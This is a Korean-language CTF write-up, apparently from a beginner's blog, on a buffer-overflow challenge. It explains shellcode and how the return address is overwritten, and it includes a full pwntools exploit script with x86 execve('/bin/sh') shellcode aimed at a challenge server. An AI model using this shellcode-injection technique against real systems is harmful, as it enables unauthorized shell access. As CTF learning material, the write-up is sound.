## 사전지식    
쉘코드. 
음..왠만한 사람들은 다 알거라 생각하지만    
나같은 늅늅이들은 그런거 모르니 간단하게 설명하자면   
시스템의 특정 명령을 실행하는 작은 사이즈의 프로그램(코드)다.   
보통 메모리에 쉘코드를 넣고 ret에 쉘코드가 저장된 메모리의 주소로 덮어 씌워 쉘을 실행시킨다.   
주로 관리자 권한의 쉘을 얻는 용도.   
구글링하면 다-나온다.   

## 풀이   
일단 아이다로 까보면 read함수를 통해 표준입력(0)으로 0x32만큼 입력받고   
다시 gets로 0x14크기의 s에 입력받도록 하는 코드다.   
이때 read함수를 보면 name이라는 전역변수에 저장하는 것을 알 수 있는데,    
다른 걸 살펴봐도 마땅히 flag을 얻을 만한 방법이 안보이니까...    
첫 번째 입력 때 name에 쉘코드를 입력하고,   
두 번째 입력 받을 때 ret까지 BOF를 일으키고 name의 주소를 넣어서 name안에 있는 쉘코드를 실행하게 하면 될 것이다.   
근데 뉸뉸이들은 '에 ret까지 어떻게 BOF를 일으켜요?'할 것이다.   
ida를 자세히 살펴보면 s의 크기는 0x14인걸 알수 있으니 0x14에 sfp크기, 4byte크기만큼   
더미값을 넣어서 BOF를 일으키면 된다.   


코드보자!    
```
from pwn import *
p=remote("ctf.j0n9hyun.xyz", 3003)
p.recvuntil("Name : ")
shellcode="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"
p.sendline(shellcode)
p.recvuntil("input : ")
payload = "A"*24
payload += p32(0x804A060)
p.sendline(payload)
p.interactive()
```  


